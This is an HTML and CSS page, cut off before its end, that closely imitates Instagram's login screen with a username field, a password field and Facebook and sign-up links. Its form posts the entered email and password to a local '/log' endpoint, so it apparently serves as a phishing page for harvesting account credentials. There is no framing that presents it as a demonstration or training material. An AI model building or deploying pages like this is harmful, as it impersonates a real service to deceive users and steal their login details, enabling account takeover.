<html lang="en">

    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background: #fafafa;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            width: 100%;
            max-width: 350px;
        }

        .phone-mockup {
            display: none;
        }

        .main-content {
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .login-box {
            background: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 40px;
            margin-bottom: 10px;
            width: 100%;
        }

        .logo {
            background-image: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNzUiIGhlaWdodD0iNTEiIHZpZXdCb3g9IjAgMCAxNzUgNTEiPjxkZWZzPjxsaW5lYXJHcmFkaWVudCBpZD0iYSIgeDE9IjAlIiB5MT0iNTAlIiB4Mj0iMTAwJSIgeTI9IjUwJSI+PHN0b3Agb2Zmc2V0PSIwJSIgc3RvcC1jb2xvcj0iI0Q0MDBDMyIvPjxzdG9wIG9mZnNldD0iMTAwJSIgc3RvcC1jb2xvcj0iI0ZGNEMwRCIvPjwvbGluZWFyR3JhZGllbnQ+PC9kZWZzPjx0ZXh0IHg9IjAlIiB5PSI3MCUiIGZvbnQtZmFtaWx5PSInR3JhbmQgSG90ZWwnLCBjdXJzaXZlIiBmb250LXNpemU9IjQ4IiBmaWxsPSJ1cmwoI2EpIj5JbnN0YWdyYW08L3RleHQ+PC9zdmc+');
            background-size: contain;
            background-repeat: no-repeat;
            background-position: center;
            height: 51px;
            margin: 0 auto 36px;
            width: 175px;
        }

        .logo-text {
            font-family: 'Grand Hotel', 'Billabong', cursive;
            font-size: 48px;
            text-align: center;
            background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            margin-bottom: 32px;
        }

        form {
            display: flex;
            flex-direction: column;
        }

        input {
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            font-size: 12px;
            padding: 9px 8px 7px;
            margin-bottom: 6px;
            outline: none;
            transition: border-color 0.2s;
        }

        input:focus {
            border-color: #a8a8a8;
        }

        input::placeholder {
            color: #8e8e8e;
        }

        .login-btn {
            background: #0095f6;
            border: none;
            border-radius: 8px;
            color: #fff;
            font-size: 14px;
            font-weight: 600;
            padding: 7px 16px;
            margin-top: 8px;
            cursor: pointer;
            transition: background 0.2s;
        }

        .login-btn:hover {
            background: #1877f2;
        }

        .login-btn:active {
            opacity: 0.7;
        }

        .divider {
            display: flex;
            align-items: center;
            margin: 20px 0;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
        }

        .divider::before,
        .divider::after {
            content: '';
            flex: 1;
            border-bottom: 1px solid #dbdbdb;
        }

        .divider::before {
            margin-right: 18px;
        }

        .divider::after {
            margin-left: 18px;
        }

        .fb-login {
            color: #385185;
            font-size: 14px;
            font-weight: 600;
            text-align: center;
            text-decoration: none;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            margin-bottom: 20px;
        }

        .fb-login::before {
            content: '';
            width: 16px;
            height: 16px;
            background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="%23385185"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>') no-repeat center;
        }

        .fb-login:hover {
            color: #00376b;
        }

        .forgot-password {
            color: #00376b;
            font-size: 12px;
            text-align: center;
            text-decoration: none;
        }

        .forgot-password:hover {
            color: #003c75;
        }

        .signup-box {
            background: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 25px 40px;
            margin-bottom: 10px;
            width: 100%;
            text-align: center;
            font-size: 14px;
        }

        .signup-box a {
            color: #0095f6;
            font-weight: 600;
            text-decoration: none;
        }

        .signup-box a:hover {
            color: #00376b;
        }

        .get-app {
            text-align: center;
            margin: 20px 0;
        }

        .get-app p {
            font-size: 14px;
            margin-bottom: 20px;
        }

        .app-buttons {
            display: flex;
            gap: 8px;
            justify-content: center;
        }

        .app-buttons img {
            height: 40px;
            cursor: pointer;
        }

        @media (min-width: 876px) {
            .container {
                max-width: 935px;
                display: flex;
                align-items: center;
                gap: 32px;
            }

            .phone-mockup {
                display: block;
                flex: 1;
                max-width: 454px;
            }

            .main-content {
                flex: 1;
                max-width: 350px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="main-content">
            <div class="login-box">
                <div class="logo-text">Instagram</div>

                <form action="/log" method="POST">
                    <input type="text" name="email" placeholder="Phone number, username, or email" required autocomplete="username">
                    <input type="password" name="pass" placeholder="Password" required autocomplete="current-password">
                    <button type="submit" class="login-btn">Log in</button>
                </form>

                <div class="divider">OR</div>

                <a href="#" class="fb-login">Log in with Facebook</a>

                <a href="#" class="forgot-password">Forgot password?</a>
            </div>

            <div class="signup-box">
                Don't have an account? <a href="#">Sign up</a>
            </div>

            <div class="get-app">
                <p>Get the app.</p>
